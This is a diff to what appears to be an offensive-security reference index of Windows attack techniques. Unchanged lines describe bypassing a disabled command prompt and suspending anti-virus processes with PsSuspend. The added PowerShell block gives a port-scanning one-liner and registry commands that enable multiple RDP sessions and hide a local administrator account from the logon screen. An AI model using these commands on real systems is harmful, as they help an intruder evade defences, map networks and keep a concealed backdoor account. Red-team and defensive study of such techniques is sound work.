@@ -66,6 +66,14 @@ Comprehensive reference index cataloging 150+ specialized tools and offensive te
 - **Bypass Disabled Command Prompt:** Circumvent UI policy command prompt blocks using the run dialog: `cmd.exe /k "whoami"`
 - **Disable AV via Sysinternals PsSuspend:** Suspend target anti-virus service processes via native signed binary calls: `PsSuspend.exe <service_pid>`
 
+```powershell
+# Native PowerShell port scanner (LOLBas, no scanner binary on disk)
+0..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect("<target>",$_)) "Port $_ open" } 2>$null
+# Multi-session RDP + hide local admin from logon UI
+reg add HKLM\System\CurrentControlSet\Control\TerminalServer /v fSingleSessionPerUser /d 0 /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /v <account> /d 0 /f
+```
+
 ## Tool Category Index
 
 | Category | Primary Tools | Operational Function |
